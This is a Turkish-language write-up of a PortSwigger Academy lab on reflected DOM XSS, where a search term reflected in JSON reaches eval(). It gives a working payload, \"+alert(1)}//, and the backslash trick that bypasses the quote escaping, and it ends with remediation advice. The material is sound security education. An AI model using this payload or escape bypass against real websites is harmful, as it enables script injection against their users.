# Reflected DOM XSS — Writeup

**Platform:** PortSwigger Web Security Academy
**Tarih:** 2026-11-21

---

## Executive Summary

- **Hedef:** `https://<lab-id>.web-security-academy.net/` (PortSwigger lab)
- **Zorluk:** İleri (Advanced)
- **Tespit Edilen Zafiyet:** Reflected DOM XSS — arama terimi sunucunun JSON cevabına yansıyor, client-side JS o cevabı **`eval()`** ile işliyor. JSON string'inden kaçıp eval'e JS enjekte edilerek XSS
- **Genel Etki:** Saldırgan keyfi JavaScript çalıştırabilir
- **Durum:** Tamamlandı — `\"+alert(1)}//`, lab çözüldü
- **Tür:** Reflected + DOM birleşimi (veri sunucudan yansır = reflected; sink client-side `eval` = DOM)

---

## Reconnaissance & Vulnerability Analysis

**İki yere bakıldı** (reflected DOM = server round-trip + client sink):

- **Network tab (yansıma):** Arama `/search-results?search=...` isteği atıyor; cevap JSON:
  ```json
  {"results":[],"searchTerm":"test123"}
  ```
  Arama terimi (`searchTerm`) cevaba **yansıyor** = source
- **Sources (sink):** Cevabı işleyen JS:
  ```javascript
  if (this.readyState == 4 && this.status == 200) {
      eval('var searchResultsObj = ' + this.responseText);
  }
  ```
  **Tüm JSON cevabı `eval()`'e** giriyor → kod olarak çalıştırılıyor. Sink = `eval`

**Mantık:** Senin arama terimin JSON'da bir string değerinin içinde; tüm JSON eval edildiği için, o string'den kaçıp JS enjekte edebilirsin.

---

## Exploitation

### Breakout yapısı (3 parça — context: JSON string içi)
1. **String'i kapat** → `"` (ama escape sorunu var, aşağıda)
2. **JS'i sok** → `+alert(1)` (operatör + çağrı; aşağıda)
3. **Geri kalanı geçersizleştir** → `}` (objeyi kapat) + `//` (kalan JSON'u yorumla)

### Engel 1 — sunucu `"`'yu escape ediyor
Ham `"` gönderince cevapta `\"` oluyor → kaçışlı tırnak, string'in parçası, breakout olmaz:
```json
{"results":[],"searchTerm":"\"alert(1)}//"}   ← " → \" olmuş, çıkamadık
```
**Bypass — backslash hilesi:** Sunucu `"`'yu escape eder ama `\`'yi **etmez.** `"`'ün önüne `\` koy:
- Sen `\"` gönderirsin → sunucu senin `"`'ünü `\"` yapar, `\`'ine dokunmaz → cevapta `\\"`
- Eval string'i okurken `\\` = tek literal backslash, sonra `"` = **string'i kapatır** → breakout ✓
- Yani escape'i escape ettin

### Engel 2 — operatör gerekli
String'i kapatınca `""alert(1)` olur = iki ifade yan yana, syntax error. Araya bir **ikili operatör** (`+`, `-`...) koyunca `"" + alert(1)` geçerli ifade olur; operatör her iki tarafı değerlendirir → `alert(1)` **çağrılır.**

### Payload
```
\"+alert(1)}//
```
Eval'de:
```javascript
var searchResultsObj = {"results":[],"searchTerm":"\\"+alert(1)}//"}
//   \\" string'i kapatır · +alert(1) çalışır · } objeyi kapatır · // kalanı keser
```

### Teslimat
Arama kutusuna / `?search=` parametresine payload. Victim gerekmez (kendi tarayıcında) → `alert` yeter.

---

## Remediation

- **`eval()` kullanma** — sunucu cevabını parse etmek için `JSON.parse()` kullan (kod çalıştırmaz, sadece veri okur).
- Kullanıcı girdisini bir code-execution sink'ine (eval, Function) sokma.
- Çıktı escape'i tek başına yetmez (burada `"` escape'liydi ama `\` ile aşıldı) — asıl çözüm tehlikeli sink'i (eval) bırakmak.

---

## Gotchas (Dikkat Edilecekler)

- **Reflected DOM = reflected (server round-trip) + DOM (client sink).** İki yere bak: **Network** (sunucu cevabındaki yansıma) + **Sources** (cevabı işleyen client-side sink). Saf DOM'dan farkı: Network tab da gerekli.
- **Sink = `eval` on the whole response.** Tüm JSON cevabı eval ediliyor → JSON'dan kaçıp kod sokabilirsin.
- **Sunucu `"`'yu escape eder (`\"`), `\`'yi etmez** → `\"` ile escape'i escape et (`\\"` = literal backslash + string-kapatıcı). Bu backslash hilesi türetilemez, bilinir.
- **Breakout sonrası operatör şart:** `""alert(1)` syntax error; `""+alert(1)` geçerli. Herhangi bir ikili operatör (`+`/`-`/`*`) iş görür — ikisini de değerlendirir, alert yan etki olarak çalışır.
- **`}//`:** `}` objeyi kapatır, `//` kalan JSON'u (`"}`) yorumlar → syntax error önlenir.
- **JSON.parse olsaydı güvenliydi** — `eval` yerine `JSON.parse` kod çalıştırmaz. Zafiyetin kalbi `eval`.

---

## Zincir Özeti

```
?search=\"+alert(1)}//
  → sunucu cevabı: {"results":[],"searchTerm":"\\"+alert(1)}//"}   (reflected)
  → eval('var searchResultsObj = ' + cevap)   (DOM sink, client-side)
  → \\" string'i kapatır (escape bypass) · +alert(1) çalışır · }// kalanı keser
  → alert
```
